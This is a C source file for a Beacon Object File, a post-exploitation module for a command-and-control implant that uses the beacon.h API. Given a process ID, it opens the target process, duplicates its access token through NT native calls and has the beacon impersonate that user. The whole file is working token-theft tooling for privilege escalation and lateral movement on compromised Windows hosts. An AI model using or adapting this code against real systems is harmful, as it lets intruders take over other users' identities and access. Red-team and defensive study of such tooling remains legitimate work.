#include <windows.h>
#include <ntsecapi.h>
#include <ntdef.h>
#include "../_include/beacon.h"

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

WINBASEAPI NTSTATUS NTAPI NTDLL$NtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId );
WINBASEAPI NTSTATUS NTAPI NTDLL$NtOpenProcessToken( HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle );
WINBASEAPI NTSTATUS NTAPI NTDLL$NtDuplicateToken( HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle );
WINBASEAPI ULONG    NTAPI NTDLL$RtlNtStatusToDosError( NTSTATUS Status );
WINBASEAPI NTSTATUS NTAPI NTDLL$NtClose(HANDLE Handle);
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

//// impersonation
//   NtOpenProcessToken - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE
//   NtDuplicateToken   - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE

//// Create Process
// NtOpenProcessToken - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES | TOKEN_ASSIGN_PRIMARY
// NtDuplicateToken   - TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    DWORD pid = BeaconDataInt(&parser);

    OBJECT_ATTRIBUTES ObjAttr  = { sizeof( ObjAttr ) };
    CLIENT_ID         Client   = {0};
    HANDLE            hProcess = NULL;

    Client.UniqueProcess = pid;
    NTSTATUS NtStatus = NTDLL$NtOpenProcess( &hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &ObjAttr, &Client );
    if ( NT_SUCCESS(NtStatus) && hProcess) {

        HANDLE hToken = NULL;
        NtStatus = NTDLL$NtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken );
        if ( NT_SUCCESS(NtStatus) && hToken) {

            HANDLE hDupToken = NULL;
            OBJECT_ATTRIBUTES ObjAttr;
            SECURITY_QUALITY_OF_SERVICE Sqos = { sizeof(SECURITY_QUALITY_OF_SERVICE), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
            InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
            ObjAttr.SecurityQualityOfService = &Sqos;

            NTSTATUS Status = NTDLL$NtDuplicateToken( hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &ObjAttr, FALSE, TokenImpersonation, &hDupToken );
            if ( NT_SUCCESS(Status) && hDupToken ) {
                if( BeaconUseToken(hDupToken) )
                    BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully.\n");
                else
                    BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate user. Error: %d\n", KERNEL32$GetLastError());
            }
            else {
                ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
                BeaconPrintf(CALLBACK_ERROR, "Failed to duplicate token. Error: %d\n", error);
            }
        }
        else {
            ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
            BeaconPrintf(CALLBACK_ERROR, "Failed to open token. Error: %d\n", error);
        }

        if ( hToken ) {
            NTDLL$NtClose(hToken);
            hToken = NULL;
        }
    }
    else {
        ULONG error = NTDLL$RtlNtStatusToDosError(NtStatus);
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process. Error: %d\n", error);
    }

    if ( hProcess ) {
        NTDLL$NtClose(hProcess);
        hProcess = NULL;
    }
}